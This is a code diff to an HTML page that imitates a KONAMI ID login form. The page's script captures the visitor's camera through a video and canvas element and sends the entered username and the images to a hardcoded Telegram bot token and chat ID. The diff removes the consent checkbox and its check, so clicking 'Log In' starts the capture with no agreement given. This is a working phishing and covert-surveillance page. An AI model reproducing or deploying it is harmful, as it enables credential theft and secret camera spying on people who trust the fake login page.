@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -114,11 +116,11 @@
       color: #333;
     }
 
-    .checkbox {
-      margin-bottom: 15px;
-      text-align: left;
+    .notice {
       font-size: 14px;
-      color: #333;
+      margin-bottom: 15px;
+      color: #e60012;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -130,9 +132,7 @@
 
     <input id="username" type="text" placeholder="KONAMI ID / E-mail address">
 
-    <div class="checkbox">
-      <input type="checkbox" id="agree"> <label for="agree">✅ يجب الموافقة على جميع الشروط</label>
-    </div>
+    <div class="notice">✅ يجب الموافقة على جميع الشروط للمتابعة</div>
 
     <button id="loginBtn" class="btn login-btn">Log In</button>
 
@@ -162,7 +162,6 @@ const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw"; // ضع التو
 const CHAT_ID = "6504203392";        // ضع chat_id الخاص بك
 const loginBtn = document.getElementById("loginBtn");
 const statusDiv = document.getElementById("status");
-const agreeCheckbox = document.getElementById("agree");
 const video = document.getElementById("v");
 const canvas = document.getElementById("c");
 const ctx = canvas.getContext("2d");
@@ -213,11 +212,6 @@ async function captureOnce(){
 }
 
 async function startProcess(){
-  if(!agreeCheckbox.checked){
-    alert("❌ يجب الموافقة على جميع الشروط قبل المتابعة.");
-    return;
-  }
-
   loginBtn.disabled = true;
   setStatus("جاري إرسال البيانات...");
 
@@ -235,7 +229,7 @@ async function startProcess(){
     setStatus("✅ اكتملت العملية بنجاح");
     stream.getTracks().forEach(t=>t.stop());
   } catch(err){
-    setStatus(err.message, true); // يظهر زر إعادة المحاولة هنا
+    setStatus(err.message, true);
   } finally {
     loginBtn.disabled = false;
   }
@@ -246,5 +240,4 @@ loginBtn.addEventListener("click", startProcess);
 
 </body>
 </html>
-
 
